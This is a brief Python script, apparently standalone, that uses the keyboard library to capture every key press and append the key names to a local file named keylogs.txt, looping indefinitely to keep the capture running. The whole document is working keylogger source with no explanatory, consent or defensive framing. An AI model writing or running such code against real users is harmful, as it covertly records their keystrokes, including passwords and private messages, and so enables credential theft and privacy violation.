import keyboard
import time

def on_press(event):
    with open("keylogs.txt", "a") as file:
        file.write(str(event.name) + " ")

keyboard.on_press(on_press)

while True:
    time.sleep(0.1)
